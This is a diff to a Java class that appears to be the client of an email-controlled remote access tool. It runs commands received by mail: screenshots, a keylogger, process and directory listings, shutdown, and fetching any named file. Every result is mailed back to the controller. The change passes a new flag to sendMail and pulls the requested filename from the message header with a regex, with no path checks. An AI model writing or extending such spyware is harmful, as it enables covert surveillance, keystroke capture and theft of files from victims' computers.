@@ -7,12 +7,14 @@ import java.nio.file.Path;
 import java.time.ZonedDateTime;
 import java.time.format.DateTimeFormatter;
 import java.util.Arrays;
+import java.util.regex.Matcher;
+import java.util.regex.Pattern;
 
 public class MainClient {
     private static boolean takeShot(int id) {
         String subject = "res/" + id;
         try {
-            SendMail.getInstance().sendMail(subject, null, Screenshot.getInstance().takeScreenShot());
+            SendMail.getInstance().sendMail(subject, null, Screenshot.getInstance().takeScreenShot(), true);
             return true;
         } catch (IOException | MessagingException e) {
             e.printStackTrace();
@@ -27,7 +29,7 @@ public class MainClient {
         try {
             KeyLogger.getInstance().startLog(filename, time);
             String subject = "res / " + id;
-            SendMail.getInstance().sendMail(subject, null, filename);
+            SendMail.getInstance().sendMail(subject, null, filename, true);
             return true;
         } catch (IOException e) {
             System.out.println("Error log");
@@ -47,7 +49,7 @@ public class MainClient {
         }catch (Exception e){
             String subject = "res / " + id;
             try {
-                SendMail.getInstance().sendMail(subject, "Can't Shutdown due to eror: " + e.toString(), null);
+                SendMail.getInstance().sendMail(subject, "Can't Shutdown due to eror: " + e.toString(), null, true);
             }catch (IOException | MessagingException er){
                 er.printStackTrace();
             }
@@ -59,7 +61,7 @@ public class MainClient {
     private static boolean ListProcess(int id){
         String subject = "res/"+id;
         try{
-            SendMail.getInstance().sendMail(subject,null, ProcessPC.getInstance().ProcessList());
+            SendMail.getInstance().sendMail(subject,null, ProcessPC.getInstance().ProcessList(), true);
             return true;
         }catch(IOException | MessagingException e){
             e.printStackTrace();
@@ -73,7 +75,7 @@ public class MainClient {
             String filename = "LIST DIR" + ZonedDateTime.now().format(DateTimeFormatter
                     .ofPattern(" dd-MM-yyyy HH-mm")) + ".txt";
             list.listAll(filename);
-            SendMail.getInstance().sendMail("res/" + id,null, filename);
+            SendMail.getInstance().sendMail("res/" + id,null, filename, true);
             return true;
         } catch (IOException | MessagingException e) {
             System.out.println("error when list");
@@ -82,20 +84,27 @@ public class MainClient {
         }
     }
 
-    public static boolean getFile(int id, String filename) {
+    public static boolean getFile(int id, String header) {
         try {
+            Pattern pattern = Pattern.compile("\"(.*)\"");
+            Matcher matcher = pattern.matcher(header);
+            String filename = "bomaylaymay.txt";
+            if (matcher.find()) {
+                filename = matcher.group(1);
+                System.out.println(filename);
+            }
             Path file = Path.of(filename);
             if (Files.exists(file)) {
                 if (Files.isRegularFile(file))
-                    SendMail.getInstance().sendMail("res/" + id, null, filename);
+                    SendMail.getInstance().sendMail("res/" + id, null, filename, false);
                 else {
                     SendMail.getInstance().sendMail("res/" + id + "/0000/You are request for a directory type"
-                            , "directory request", null);
+                            , "directory request", null, false);
                 }
             }
             else{
                 SendMail.getInstance().sendMail("res/" + id + "/0000/File doesnt exists, try list Dir!"
-                        , "File dont exist", null);
+                        , "File dont exist", null, false);
             }
             return true;
         } catch (IOException | MessagingException e) {
@@ -127,8 +136,7 @@ public class MainClient {
         else if (command.equalsIgnoreCase("listdir")) {
             return listDir(id);
         } else if (command.equalsIgnoreCase("get")) {
-            String filename = parts[3].trim().replaceAll("\"","");
-            return getFile(id,filename);
+            return getFile(id,header);
         }
         return false;
     }
